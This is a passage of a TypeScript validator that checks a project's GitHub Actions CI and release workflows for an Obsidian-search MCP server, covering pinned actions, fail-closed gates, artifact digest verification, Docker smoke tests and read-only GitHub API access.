      schemaArtifactWith?.name !== "emitted-mcp-schema-inventory" ||
      schemaArtifactWith?.path !== "tests/fixtures/mcp-schema-inventory.v1.json" ||
      schemaArtifactWith?.["if-no-files-found"] !== "error" ||
      schemaArtifactWith?.["retention-days"] !== 3 ||
      schemaArtifactWith?.["compression-level"] !== 0 ||
      "if" in (schemaArtifact ?? {}) ||
      "continue-on-error" in (schemaArtifact ?? {}) ||
      schemaDiff?.run !== "git diff --exit-code -- tests/fixtures/mcp-schema-inventory.v1.json" ||
      "if" in (schemaDiff ?? {}) ||
      "continue-on-error" in (schemaDiff ?? {}) ||
      !(schemaCaptureIndex < schemaArtifactIndex && schemaArtifactIndex < schemaDiffIndex) ||
      schemaDiffIndex >= previewRenderIndex
    ) {
      problems.push("docs job must export and fail closed on remotely captured MCP schema drift");
    }
    if (
      "if" in docsJob ||
      "continue-on-error" in docsJob ||
      !previewRender ||
      "if" in previewRender ||
      "continue-on-error" in previewRender ||
      previewRenderIndex >= previewDiffIndex ||
      previewDiff?.run !== "git diff --exit-code -- assets/social-preview.png" ||
      "if" in (previewDiff ?? {}) ||
      "continue-on-error" in (previewDiff ?? {})
    ) {
      problems.push("docs job must regenerate and fail closed on social-preview byte drift");
    }
    if (
      previewArtifact?.id !== "preview_artifact" ||
      previewArtifact?.uses !== "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a" ||
      previewArtifactWith?.name !== "rendered-social-preview" ||
      previewArtifactWith?.path !== "assets/social-preview.png" ||
      previewArtifactWith?.["if-no-files-found"] !== "error" ||
      previewArtifactWith?.["retention-days"] !== 3 ||
      previewArtifactWith?.["compression-level"] !== 0 ||
      "if" in (previewArtifact ?? {}) ||
      "continue-on-error" in (previewArtifact ?? {}) ||
      previewRenderIndex >= previewArtifactIndex ||
      previewArtifactIndex >= previewDiffIndex
    ) {
      problems.push("docs job must export the remotely rendered social preview before byte-drift enforcement");
    }
  }

  const matrixGateProblems = (
    job: YamlRecord | null,
    aggregate: YamlRecord | null,
    id: "protocol-conformance" | "package-consumer" | "mcpb-basic",
    expectedRows: Array<{ label: string; os: string; scriptShell: string }>,
    scripts: string[]
  ): void => {
    const matrixId = `${id}-matrix`;
    if (!job) {
      problems.push(`missing ${matrixId} job`);
      return;
    }
    const jobRowsValue = yamlRecord(yamlRecord(job.strategy)?.matrix)?.include;
    const jobRows = Array.isArray(jobRowsValue)
      ? jobRowsValue.map(yamlRecord).filter((row): row is YamlRecord => row !== null)
      : [];
    const actualRows = jobRows.map((row) => ({
      label: row.label,
      os: row.os,
      scriptShell: row.script_shell
    }));
    if (JSON.stringify(actualRows) !== JSON.stringify(expectedRows)) {
      problems.push(`${id} matrix must preserve its exact blocking platform inventory`);
    }
    const jobEnv = yamlRecord(job.env);
    const jobSteps = yamlSteps(job);
    const isMcpb = id === "mcpb-basic";
    const setup = jobSteps.find((step) => typeof step.uses === "string" && step.uses.startsWith("actions/setup-node@"));
    const install = namedStep(jobSteps, "Install deps (npm ci with retry)");
    if (
      job.name !== `${id} (\${{ matrix.label }})` ||
      job["runs-on"] !== `\${{ matrix.os }}` ||
      "continue-on-error" in job ||
      "if" in job ||
      (isMcpb ? job.needs !== "mcpb-basic-package" : "needs" in job) ||
      yamlRecord(yamlRecord(job.defaults)?.run)?.shell !== "bash" ||
      jobEnv?.NPM_CONFIG_ENGINE_STRICT !== "true" ||
      jobEnv?.NPM_CONFIG_SCRIPT_SHELL !== `\${{ matrix.script_shell }}` ||
      yamlRecord(setup?.with)?.["node-version"] !== floor ||
      !hasRunLine(install, "npm ci && break") ||
      (!isMcpb && !jobSteps.some((step) => step.run === "npm run build")) ||
      !scripts.every((script) => jobSteps.some((step) => step.run === script)) ||
      jobSteps.some((step) => "continue-on-error" in step || "if" in step)
    ) {
      problems.push(
        isMcpb
          ? "mcpb-basic matrix must be exact-floor, unconditional, fail-capable, and consume the canonical artifact"
          : `${id} matrix must be exact-floor, unconditional, fail-capable, built, and executable`
      );
    }

    if (!aggregate) {
      problems.push(`missing ${id} aggregate job`);
      return;
    }
    const aggregateSteps = yamlSteps(aggregate);
    const gate = aggregateSteps[0];
    const gateEnv = yamlRecord(gate?.env);
    const gateRun = runBody(gate);
    if (
      aggregate.name !== id ||
      aggregate["runs-on"] !== "ubuntu-latest" ||
      aggregate.needs !== matrixId ||
      aggregate.if !== `\${{ always() }}` ||
      "continue-on-error" in aggregate ||
      aggregateSteps.length !== 1 ||
      gateEnv?.MATRIX_RESULT !== `\${{ needs['${matrixId}'].result }}` ||
      !gateRun.includes('"$MATRIX_RESULT" != "success"') ||
      !gateRun.includes("exit 1") ||
      "if" in (gate ?? {}) ||
      "continue-on-error" in (gate ?? {})
    ) {
      problems.push(`${id} aggregate must fail closed over every matrix lane`);
    }
  };

  matrixGateProblems(
    protocolMatrixJob,
    protocolAggregateJob,
    "protocol-conformance",
    [
      { label: "linux", os: "ubuntu-latest", scriptShell: "/bin/bash" },
      { label: "windows", os: "windows-2025", scriptShell: "C:\\Program Files\\Git\\bin\\bash.exe" }
    ],
    ["node scripts/protocol-conformance.mjs"]
  );
  matrixGateProblems(
    packageMatrixJob,
    packageAggregateJob,
    "package-consumer",
    [
      { label: "linux", os: "ubuntu-latest", scriptShell: "/bin/bash" },
      { label: "windows", os: "windows-2025", scriptShell: "C:\\Program Files\\Git\\bin\\bash.exe" },
      { label: "macos", os: "macos-latest", scriptShell: "/bin/bash" }
    ],
    ["node scripts/package-consumer.mjs"]
  );
  matrixGateProblems(
    mcpbMatrixJob,
    mcpbAggregateJob,
    "mcpb-basic",
    [
      { label: "linux", os: "ubuntu-latest", scriptShell: "/bin/bash" },
      { label: "windows", os: "windows-2025", scriptShell: "C:\\Program Files\\Git\\bin\\bash.exe" },
      { label: "macos", os: "macos-latest", scriptShell: "/bin/bash" }
    ],
    ["npm run mcpb:verify"]
  );
  if (!mcpbPackageJob) {
    problems.push("missing mcpb-basic-package job");
  } else {
    const packageSteps = yamlSteps(mcpbPackageJob);
    const setup = packageSteps.find(
      (step) => typeof step.uses === "string" && step.uses.startsWith("actions/setup-node@")
    );
    const install = namedStep(packageSteps, "Install deps (npm ci with retry)");
    const artifactIdentity = namedStep(packageSteps, "Bind artifact identity to the producer attempt");
    const exportStep = namedStep(packageSteps, "Export inspectable canonical MCPB candidate and transparency records");
    const exportWith = yamlRecord(exportStep?.with);
    const exportPath = typeof exportWith?.path === "string" ? exportWith.path : "";
    const packageEnv = yamlRecord(mcpbPackageJob.env);
    if (
      mcpbPackageJob.name !== "mcpb-basic-package" ||
      mcpbPackageJob["runs-on"] !== "ubuntu-latest" ||
      "needs" in mcpbPackageJob ||
      "if" in mcpbPackageJob ||
      "continue-on-error" in mcpbPackageJob ||
      packageEnv?.NPM_CONFIG_ENGINE_STRICT !== "true" ||
      packageEnv?.NPM_CONFIG_SCRIPT_SHELL !== "/bin/bash" ||
      yamlRecord(setup?.with)?.["node-version"] !== floor ||
      !hasRunLine(install, "npm ci && break") ||
      yamlRecord(mcpbPackageJob.outputs)?.artifact_name !== `\${{ steps.artifact_identity.outputs.name }}` ||
      artifactIdentity?.id !== "artifact_identity" ||
      artifactIdentity?.run !== 'echo "name=mcpb-basic-candidate-$GITHUB_RUN_ATTEMPT" >> "$GITHUB_OUTPUT"' ||
      !packageSteps.some((step) => step.run === "npm run build") ||
      !packageSteps.some((step) => step.run === "npm run mcpb:build") ||
      !packageSteps.some((step) => step.run === "npm run mcpb:verify") ||
      packageSteps.some((step) => "if" in step || "continue-on-error" in step) ||
      exportStep?.uses !== "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a" ||
      exportWith?.name !== `\${{ steps.artifact_identity.outputs.name }}` ||
      !exportPath.includes("artifacts/enquire-mcp-basic-*.mcpb") ||
      !exportPath.includes("artifacts/enquire-mcp-basic-*.content-manifest.json") ||
      !exportPath.includes("artifacts/enquire-mcp-basic-*.sbom.cdx.json") ||
      !exportPath.includes("artifacts/enquire-mcp-basic-*.third-party-licenses.json") ||
      exportWith?.["if-no-files-found"] !== "error" ||
      exportWith?.["retention-days"] !== 7 ||
      exportWith?.["compression-level"] !== 0
    ) {
      problems.push(
        "mcpb-basic package job must build, verify, and export one fail-closed canonical Linux bundle with inventory, SBOM, and notices"
      );
    }

    const workflowPermissions = yamlRecord(document?.permissions);
    const packagePermissions = yamlRecord(mcpbPackageJob.permissions);
    const workflowPermissionKeys = workflowPermissions ? Object.keys(workflowPermissions).sort() : [];
    const packagePermissionKeys = packagePermissions ? Object.keys(packagePermissions).sort() : [];
    const permissionedJobIds = Object.entries(jobs ?? {})
      .filter(([, job]) => {
        const jobRecord = yamlRecord(job);
        return jobRecord !== null && "permissions" in jobRecord;
      })
      .map(([id]) => id)
      .sort();
    const packageEnvKeys = packageEnv ? Object.keys(packageEnv).sort() : [];
    const exportIndex = exportStep === undefined ? -1 : packageSteps.indexOf(exportStep);
    const canaryIndex = packageSteps.findIndex(
      (step) => step.name === "Verify uploaded MCPB artifact through Actions REST"
    );
    const canary = packageSteps[canaryIndex];
    const canaryEnv = yamlRecord(canary?.env);
    const canaryEnvKeys = canaryEnv ? Object.keys(canaryEnv).sort() : [];
    const canaryRun = runBody(canary);
    const expectedCanaryRun = [
      "set -euo pipefail",
      'if [[ ! "$ARTIFACT_ID" =~ ^[1-9][0-9]*$ ]]; then',
      '  echo "::error::upload-artifact returned an invalid artifact ID"',
      "  exit 1",
      "fi",
      'if [[ ! "$ARTIFACT_DIGEST" =~ ^[0-9a-f]{64}$ ]]; then',
      '  echo "::error::upload-artifact returned a digest that is not 64 lowercase hex characters"',
      "  exit 1",
      "fi",
      "",
      `CANDIDATE_ZIP=$(mktemp "$RUNNER_TEMP/mcpb-artifact-\${GITHUB_RUN_ID}-\${GITHUB_RUN_ATTEMPT}-\${ARTIFACT_ID}.XXXXXX.zip")`,
      "downloaded=false",
      "for attempt in {1..12}; do",
      "  if timeout --kill-after=5s 30s gh api \\",
      '    -H "Accept: application/vnd.github+json" \\',
      '    "repos/$GITHUB_REPOSITORY/actions/artifacts/$ARTIFACT_ID/zip" > "$CANDIDATE_ZIP"; then',
      "    ACTUAL_DIGEST=$(sha256sum \"$CANDIDATE_ZIP\" | awk '{print $1}')",
      '    if [ "$ACTUAL_DIGEST" != "$ARTIFACT_DIGEST" ]; then',
      '      echo "::error::downloaded Actions artifact digest differs from upload output"',
      "      exit 1",
      "    fi",
      "    downloaded=true",
      "    break",
      "  fi",
      '  echo "::warning::Actions artifact $ARTIFACT_ID is not downloadable yet (attempt $attempt/12)"',
      '  if [ "$attempt" -lt 12 ]; then',
      "    sleep 5",
      "  fi",
      "done",
      'if [ "$downloaded" != "true" ]; then',
      '  echo "::error::Actions artifact $ARTIFACT_ID was not downloadable after 12 bounded attempts"',
      "  exit 1",
      "fi",
      'echo "Verified Actions artifact id=$ARTIFACT_ID sha256=$ARTIFACT_DIGEST"'
    ].join("\n");
    if (
      mcpbPackageJob["timeout-minutes"] !== 40 ||
      JSON.stringify(workflowPermissionKeys) !== JSON.stringify(["contents"]) ||
      workflowPermissions?.contents !== "read" ||
      JSON.stringify(packagePermissionKeys) !== JSON.stringify(["actions", "contents"]) ||
      packagePermissions?.actions !== "read" ||
      packagePermissions?.contents !== "read" ||
      JSON.stringify(permissionedJobIds) !== JSON.stringify(["mcpb-basic-package"]) ||
      "env" in (document ?? {}) ||
      JSON.stringify(packageEnvKeys) !== JSON.stringify(["NPM_CONFIG_ENGINE_STRICT", "NPM_CONFIG_SCRIPT_SHELL"]) ||
      "defaults" in mcpbPackageJob ||
      exportStep?.id !== "mcpb_export" ||
      exportIndex < 0 ||
      canaryIndex !== exportIndex + 1 ||
      !canary ||
      "if" in (canary ?? {}) ||
      "continue-on-error" in (canary ?? {}) ||
      canary?.shell !== "bash" ||
      JSON.stringify(canaryEnvKeys) !==
        JSON.stringify(["ARTIFACT_DIGEST", "ARTIFACT_ID", "BASH_ENV", "GH_HOST", "GH_TOKEN"]) ||
      canaryEnv?.BASH_ENV !== "" ||
      canaryEnv?.GH_HOST !== "github.com" ||
      canaryEnv?.GH_TOKEN !== `\${{ github.token }}` ||
      canaryEnv?.ARTIFACT_ID !== `\${{ steps.mcpb_export.outputs.artifact-id }}` ||
      canaryEnv?.ARTIFACT_DIGEST !== `\${{ steps.mcpb_export.outputs.artifact-digest }}` ||
      canaryRun.trimEnd() !== expectedCanaryRun
    ) {
      problems.push(
        "mcpb-basic package job must grant scoped Actions read access and verify the uploaded artifact by exact ID and digest"
      );
    }
  }
  const mcpbSteps = yamlSteps(mcpbMatrixJob);
  const mcpbDownload = namedStep(mcpbSteps, "Download canonical Linux MCPB candidate");
  const mcpbDownloadWith = yamlRecord(mcpbDownload?.with);
  if (
    mcpbDownload?.uses !== "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c" ||
    mcpbDownloadWith?.name !== `\${{ needs['mcpb-basic-package'].outputs.artifact_name }}` ||
    mcpbDownloadWith?.path !== "artifacts" ||
    mcpbDownloadWith?.["digest-mismatch"] !== "error" ||
    "if" in (mcpbDownload ?? {}) ||
    "continue-on-error" in (mcpbDownload ?? {})
  ) {
    problems.push("mcpb-basic matrix must consume the exact pinned canonical Linux artifact on every OS");
  }

  if (!dockerJob) {
    problems.push("docker smoke probes must be exactly bounded and fail closed on process status");
  } else {
    const dockerSteps = yamlSteps(dockerJob);
    const dockerCheckoutStep = dockerSteps[0];
    const dockerBuildStep = dockerSteps[1];
    const cliDockerSteps = dockerSteps.filter((step) => step.name === "CLI smoke — the bin runs inside the image");
    const mcpDockerSteps = dockerSteps.filter(
      (step) => step.name === "MCP tools/list smoke — stdio introspection (what Glama does)"
    );
    const cliDockerStep = cliDockerSteps[0];
    const mcpDockerStep = mcpDockerSteps[0];
    const cliDockerEnv = yamlRecord(cliDockerStep?.env);
    const mcpDockerEnv = yamlRecord(mcpDockerStep?.env);
    const cliDockerRun = runBody(cliDockerStep);
    const mcpDockerRun = runBody(mcpDockerStep);
    const expectedCliDockerRun = [
      "docker_status=0",
      "out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help) || docker_status=$?",
      'if [ "$docker_status" -ne 0 ]; then',
      '  echo "::error::Docker CLI smoke exited with status $docker_status"',
      "  printf '%s\\n' \"$out\" | tail -c 600",
      "  exit 1",
      "fi",
      'grep -qi \'serve\' <<<"$out" || { echo "::error::--help did not list the serve subcommand"; printf \'%s\\n\' "$out" | tail -c 600; exit 1; }',
      'echo "OK — bin runs in image; --help lists serve"'
    ].join("\n");
    const expectedMcpDockerRun = [
      "docker_status=0",
      "out=$(printf '%s\\n' \\",
      '  \'{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"ci","version":"0"}}}\' \\',
      '  \'{"jsonrpc":"2.0","method":"notifications/initialized"}\' \\',
      '  \'{"jsonrpc":"2.0","id":2,"method":"tools/list"}\' \\',
      "  | timeout --kill-after=10s 90s docker run --rm -i enquire-mcp:ci) || docker_status=$?",
      'if [ "$docker_status" -ne 0 ]; then',
      '  echo "::error::Docker MCP smoke exited with status $docker_status"',
      "  printf '%s\\n' \"$out\" | tail -c 1000",
      "  exit 1",
      "fi",
      'grep -q \'"obsidian_search"\' <<<"$out" || { echo "::error::tools/list did not return obsidian_search from the container"; printf \'%s\\n\' "$out" | tail -c 1000; exit 1; }',
      'echo "OK — tools/list returned obsidian_search over stdio"'
    ].join("\n");
    if (
      JSON.stringify(Object.keys(dockerJob).sort()) !== JSON.stringify(["runs-on", "steps", "timeout-minutes"]) ||
      dockerJob["runs-on"] !== "ubuntu-latest" ||
      dockerJob["timeout-minutes"] !== 10 ||
      dockerSteps.length !== 4 ||
      JSON.stringify(Object.keys(dockerCheckoutStep ?? {}).sort()) !== JSON.stringify(["uses"]) ||
      dockerCheckoutStep?.uses !== "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1" ||
      JSON.stringify(Object.keys(dockerBuildStep ?? {}).sort()) !== JSON.stringify(["name", "run"]) ||
      dockerBuildStep?.name !== "Build the introspection image" ||
      dockerBuildStep?.run !== "docker build -t enquire-mcp:ci ." ||
      cliDockerSteps.length !== 1 ||
      mcpDockerSteps.length !== 1 ||
      JSON.stringify(Object.keys(cliDockerStep ?? {}).sort()) !== JSON.stringify(["env", "name", "run", "shell"]) ||
      JSON.stringify(Object.keys(mcpDockerStep ?? {}).sort()) !== JSON.stringify(["env", "name", "run", "shell"]) ||
      cliDockerStep?.shell !== "bash" ||
      mcpDockerStep?.shell !== "bash" ||
      JSON.stringify(cliDockerEnv) !== JSON.stringify({ BASH_ENV: "" }) ||
      JSON.stringify(mcpDockerEnv) !== JSON.stringify({ BASH_ENV: "" }) ||
      mutationMatchCount(workflow, "docker run") !== 2 ||
      cliDockerRun.trimEnd() !== expectedCliDockerRun ||
      mcpDockerRun.trimEnd() !== expectedMcpDockerRun
    ) {
      problems.push("docker smoke probes must be exactly bounded and fail closed on process status");
    }
  }

  if (!smokeJob) return [...problems, "missing smoke job"];
  const smokeNeeds = Array.isArray(smokeJob.needs) ? smokeJob.needs.filter((item) => typeof item === "string") : [];
  if (smokeNeeds.length !== 2 || !smokeNeeds.includes("test") || !smokeNeeds.includes("test-windows")) {
    problems.push("smoke must wait for exactly the Linux matrix and blocking Windows job");
  }
  if (smokeJob.if !== `\${{ always() }}`) {
    problems.push("smoke must run its prerequisite gate even after an upstream failure");
  }
  if ("continue-on-error" in smokeJob) {
    problems.push("smoke job must not declare continue-on-error");
  }
  if (yamlRecord(smokeJob.env)?.NPM_CONFIG_ENGINE_STRICT !== "true") {
    problems.push("smoke job must enforce npm engine-strict");
  }
  const smokeSteps = yamlSteps(smokeJob);
  if (smokeSteps.slice(1).some((step) => "continue-on-error" in step || "if" in step)) {
    problems.push("smoke functional steps must be unconditional and fail-capable");
  }
  const prerequisiteGate = smokeSteps[0];
  const prerequisiteEnv = yamlRecord(prerequisiteGate?.env);
  const prerequisiteRun = runBody(prerequisiteGate);
  if (
    prerequisiteGate?.name !== "Require Linux and Windows test prerequisites" ||
    "continue-on-error" in (prerequisiteGate ?? {}) ||
    "if" in (prerequisiteGate ?? {}) ||
    prerequisiteEnv?.LINUX_TEST_RESULT !== `\${{ needs.test.result }}` ||
    prerequisiteEnv?.WINDOWS_TEST_RESULT !== `\${{ needs['test-windows'].result }}` ||
    !prerequisiteRun.includes('"$LINUX_TEST_RESULT" != "success"') ||
    !prerequisiteRun.includes('"$WINDOWS_TEST_RESULT" != "success"') ||
    !prerequisiteRun.includes("] || [") ||
    !prerequisiteRun.includes("exit 1")
  ) {
    problems.push("smoke prerequisite gate must fail closed on either Linux or Windows failure");
  }
  const smokeSetup = smokeSteps.find(
    (step) => typeof step.uses === "string" && step.uses.startsWith("actions/setup-node@")
  );
  if (yamlRecord(smokeSetup?.with)?.["node-version"] !== floor) {
    problems.push(`smoke must run exact engines.node floor ${floor}`);
  }
  const smokeInstall = namedStep(smokeSteps, "Install deps (npm ci with retry)");
  if (!hasRunLine(smokeInstall, "npm ci && break")) {
    problems.push("smoke job missing executable npm ci retry");
  }
  if (!smokeSteps.some((step) => step.run === "npm run build")) {
    problems.push("smoke job missing npm run build");
  }
  const scanRun = runBody(namedStep(smokeSteps, "JSON-RPC smoke test (scan path)"));
  if (!scanRun.includes("node scripts/smoke.mjs") || scanRun.includes("--with-fts")) {
    problems.push("smoke job missing the scan-path command");
  }
  const ftsRun = runBody(namedStep(smokeSteps, "JSON-RPC smoke test (FTS5 --persistent-index path)"));
  if (!ftsRun.includes("node scripts/smoke.mjs") || !ftsRun.includes("--with-fts")) {
    problems.push("smoke job missing the persistent-FTS command");
  }

  return problems;
}

function remoteGateScriptProblems(packageConsumer: string, protocolConformance: string): string[] {
  const problems: string[] = [];
  if (
    !packageConsumer.includes("function npmProcessSpec(") ||
    !packageConsumer.includes("npm-cli.js") ||
    !packageConsumer.includes("refusing to invoke a .cmd shim") ||
    packageConsumer.includes('const NPM = process.platform === "win32" ? "npm.cmd"')
  ) {
    problems.push("package-consumer must execute npm through a cross-platform JavaScript entrypoint");
  }
  if (
    !packageConsumer.includes('runNpm(["install", "--no-audit"') ||
    packageConsumer.includes('runNpm(["install", "--ignore-scripts"')
  ) {
    problems.push("package-consumer normal installs must execute lifecycle and optional dependency paths");
  }
  if (!packageConsumer.includes("Object.keys(rootPackage.optionalDependencies ?? {})")) {
    problems.push("package-consumer omit lane must derive the complete optional dependency inventory");
  }
  if (
    !packageConsumer.includes("if (rejection === undefined)") ||
    !packageConsumer.includes('assert.fail(blockedPath + " privacy negative control unexpectedly succeeded")')
  ) {
    problems.push("package-consumer privacy negative must not catch its own leak assertion");
  }
  if (
    !protocolConformance.includes("failed through an unexpected transport/server error") ||
    !protocolConformance.includes("server was not live after traversal refusal")
  ) {
    problems.push("protocol-conformance traversal negative must distinguish refusal from crash and prove liveness");
  }
  if (
    !protocolConformance.includes('child.kill("SIGKILL")') ||
    !protocolConformance.includes("await waitForChildExit(child, 5_000)")
  ) {
    problems.push("protocol-conformance cleanup must await hard-killed children before deleting fixtures");
  }
  if (
    !protocolConformance.includes('inventory.resources.includes("obsidian://note/01_Projects/Hermes.md")') ||
    !protocolConformance.includes("synthetic note resource is missing; observed=")
  ) {
    problems.push("protocol-conformance must pin slash-preserving note resource URIs on every host");
  }
  return problems;
}

function releasePollProblems(workflow: string): string[] {
  let document: YamlRecord | null = null;
  try {
    document = yamlRecord(load(workflow));
  } catch {
    return ["release.yml must be valid YAML"];
  }
  const permissions = yamlRecord(document?.permissions) ?? {};
  if (permissions.actions !== "read" || "checks" in permissions) {
    return ["release must grant read-only Actions API access for the exact-SHA MCPB artifact"];
  }
  const publish = yamlRecord(yamlRecord(document?.jobs)?.publish);
  const steps = yamlSteps(publish ?? {});
  const releaseTransaction = releaseTransactionFixtureBody(document);
  const deadline = namedStep(steps, "Establish global release deadline");
  const gate = namedStep(steps, "Assert tag is on main and required CI checks passed");
  const body = runBody(gate);
  const deadlineBody = runBody(deadline);
  if (
    Number(publish?.["timeout-minutes"] ?? 0) !== 240 ||
    steps[0] !== deadline ||
    steps.filter((step) => step.name === "Establish global release deadline").length !== 1 ||
    deadline?.id !== "deadline" ||
    !deadlineBody.includes("set -euo pipefail") ||
    !deadlineBody.includes("NOW=$(/bin/date +%s)") ||
    !deadlineBody.includes('[[ "$NOW" =~ ^[1-9][0-9]*$ ]]') ||
    !deadlineBody.includes('echo "epoch=$((NOW + 13800))" >> "$GITHUB_OUTPUT"') ||
    deadlineBody.includes("GITHUB_ENV") ||
    !body.includes("CI_GATE_DEADLINE=$((SECONDS + 3600))") ||
    !body.includes("gate_timeout()") ||
    !body.includes(`"$TIMEOUT_BIN" --kill-after=10s "\${limit}s" "$@"`) ||
    !body.includes('gate_timeout 20 "$GH_BIN" "$@"') ||
    !body.includes('"$TIMEOUT_BIN" --kill-after=10s 120s git fetch origin main --depth=200') ||
    !body.includes("attempt<=120") ||
    !body.includes('"$attempt" -eq 120') ||
    !body.includes("after 60 minutes")
  ) {
    return ["release polling must outlive the blocking package-consumer matrix and leave publication headroom"];
  }
  const tagSyntaxIndex = body.indexOf('[[ "$TAG" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+');
  const sourceShaIndex = body.indexOf("SHA=$(git rev-parse HEAD)", tagSyntaxIndex);
  const mainFetchIndex = body.indexOf(
    '"$TIMEOUT_BIN" --kill-after=10s 120s git fetch origin main --depth=200',
    sourceShaIndex
  );
  const ancestryIndex = body.indexOf('git merge-base --is-ancestor "$SHA" origin/main', mainFetchIndex);
  const packageVersionIndex = body.indexOf(
    "VERSION=$(/usr/bin/jq -er \\\n" +
      '  \'.version | select(type == "string" and test("^[0-9]+\\\\.[0-9]+\\\\.[0-9]+([+-][0-9A-Za-z.-]+)?$"))\' \\\n' +
      "  package.json)",
    ancestryIndex
  );
  const tagEqualityIndex = body.indexOf('[ "$TAG" != "v$VERSION" ]', packageVersionIndex);
  const assertTagIndex = body.indexOf(
    'node scripts/check-release-integrity.mjs assert-tag "$TAG" "$VERSION"',
    tagEqualityIndex
  );
  const firstRepositoryNodeIndex = body.indexOf("node scripts/");
  if (
    tagSyntaxIndex < 0 ||
    sourceShaIndex <= tagSyntaxIndex ||
    mainFetchIndex <= sourceShaIndex ||
    ancestryIndex <= mainFetchIndex ||
    packageVersionIndex <= ancestryIndex ||
    tagEqualityIndex <= packageVersionIndex ||
    assertTagIndex <= tagEqualityIndex ||
    firstRepositoryNodeIndex !== assertTagIndex
  ) {
    return ["release gate must prove main ancestry before executing repository-owned code"];
  }
  const globalReadSteps = [
    namedStep(steps, "Download exact CI-gated Basic MCPB release asset"),
    namedStep(steps, "Preflight existing GitHub release and every Basic asset before npm"),
    namedStep(steps, "Publish with provenance or verify an exact prior publication"),
    namedStep(steps, "Prepare draft GitHub Release"),
    namedStep(steps, "Upload Basic MCPB asset, checksum, and provenance"),
    namedStep(steps, MCP_REGISTRY_STEP_NAME)
  ];
  const globalReadBodies = globalReadSteps.map((step) =>
    step?.name === "Upload Basic MCPB asset, checksum, and provenance" ? releaseTransaction : runBody(step)
  );
  const ghReadMutationArgs =
    "graphql|--method|--method=*|-X*|--input|--input=*|-f*|-F*|--field|--field=*|--raw-field|--raw-field=*";
  const rawGhApiLines = workflow
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /(?:^|\$\()gh api(?:\s|$)/u.test(line));
  if (
    releaseTransaction.length === 0 ||
    globalReadSteps.some(
      (step) => yamlRecord(step?.env)?.RELEASE_JOB_DEADLINE_EPOCH !== `\${{ steps.deadline.outputs.epoch }}`
    ) ||
    globalReadBodies.some(
      (readBody) =>
        !readBody.includes("gh_read() {") ||
        !readBody.includes(`"\${RELEASE_JOB_DEADLINE_EPOCH:-}" =~ ^[1-9][0-9]*$`) ||
        mutationMatchCount(readBody, GH_READ_DEADLINE_GUARD) !== 1 ||
        !readBody.includes('for argument in "$@"; do') ||
        !readBody.includes(ghReadMutationArgs) ||
        !readBody.includes("gh_read rejects mutation-capable gh api arguments") ||
        !readBody.includes(`"$TIMEOUT_BIN" --kill-after=5s "\${limit}s" "$GH_BIN" "$@"`)
    ) ||
    (workflow.match(/gh_read\(\) \{/g) ?? []).length !== GH_READ_HELPER_COUNT ||
    (workflow.match(/gh_read rejects mutation-capable gh api arguments/g) ?? []).length !== GH_READ_HELPER_COUNT ||
    mutationMatchCount(workflow, ghReadMutationArgs) !== GH_READ_HELPER_COUNT ||
    (workflow.match(/gh_read api/g) ?? []).length !== GH_READ_API_CALL_COUNT ||
    workflow.includes("gh() {") ||
    workflow.includes("gh_read api --method") ||
    rawGhApiLines.length !== 0
  ) {
    return ["all post-gate GitHub reads must consume the global deadline without shadowing release writes"];
  }
  if (
    !body.includes("actions/workflows/ci.yml/runs?branch=main&event=push&head_sha=$SHA&per_page=100") ||
    !body.includes("flatten-field workflow_runs") ||
    !body.includes("CI_RUN_COUNT=$(printf") ||
    !body.includes('[ "$CI_RUN_COUNT" -gt 1 ]') ||
    !body.includes("WORKFLOW_RUN=$(printf") ||
    !body.includes("WORKFLOW_RUN_ID=$(printf") ||
    !body.includes(". <= 9007199254740991") ||
    !body.includes("actions/runs/$WORKFLOW_RUN_ID/jobs?filter=all&per_page=100") ||
    !body.includes("flatten-field jobs") ||
    !body.includes('--argjson workflow_run "$WORKFLOW_RUN" --argjson jobs "$JOBS"') ||
    !body.includes("'{workflow_run: $workflow_run, jobs: $jobs}'") ||
    !body.includes('check-release-integrity.mjs checks "$SHA"') ||
    body.includes("check-runs?") ||
    body.includes("filter=latest")
  ) {
    return ["release checks must bind exact names to one exact ci.yml main-push workflow-run all-execution view"];
  }
  const normalizedWorkflow = workflow
    .split(/\\\r?\n\s*/u)
    .join(" ")
    .split(/\s+/u)
    .join(" ");
  const paginationBinding = (result: string, pages: string, decoder: string) =>
    `${result}=$(printf '%s' "$${pages}" | node scripts/check-release-integrity.mjs ${decoder})`;
  const strictPaginationBindings: Array<[string, number]> = [
    [paginationBinding("CI_RUNS", "CI_RUN_PAGES", "flatten-field workflow_runs"), 1],
    [paginationBinding("JOBS", "JOB_PAGES", "flatten-field jobs"), 2],
    [paginationBinding("RUNS", "RUN_PAGES", "flatten-field workflow_runs"), 1],
    [paginationBinding("CANDIDATE_ARTIFACTS", "ARTIFACT_PAGES", "flatten-field artifacts"), 1],
    [paginationBinding("RELEASES", "RELEASE_PAGES", "flatten-pages release"), 5],
    [paginationBinding("RELEASE_ASSETS", "RELEASE_ASSET_PAGES", "flatten-pages asset"), 1],
    [paginationBinding("REMOTE_ASSETS", "ASSET_PAGES", "flatten-pages asset"), 3],
    [paginationBinding("CURRENT_ASSETS", "CURRENT_ASSET_PAGES", "flatten-pages asset"), 1],
    [paginationBinding("RECOVERY_RELEASES", "RECOVERY_PAGES", "flatten-pages release"), 1],
    [paginationBinding("RECOVERY_ASSETS", "RECOVERY_ASSET_PAGES", "flatten-pages asset"), 1],
    [paginationBinding("CONFIRM_ASSETS", "CONFIRM_ASSET_PAGES", "flatten-pages asset"), 1],
    [paginationBinding("POST_ASSETS", "POST_ASSET_PAGES", "flatten-pages asset"), 1]
  ];
  if (
    strictPaginationBindings.some(
      ([binding, expected]) => mutationMatchCount(normalizedWorkflow, binding) !== expected
    ) ||
    (workflow.match(/flatten-pages release/g) ?? []).length !== 6 ||
    (workflow.match(/flatten-pages asset/g) ?? []).length !== 8 ||
    (workflow.match(/flatten-field workflow_runs/g) ?? []).length !== 2 ||
    (workflow.match(/flatten-field jobs/g) ?? []).length !== 2 ||
    (workflow.match(/flatten-field artifacts/g) ?? []).length !== 1 ||
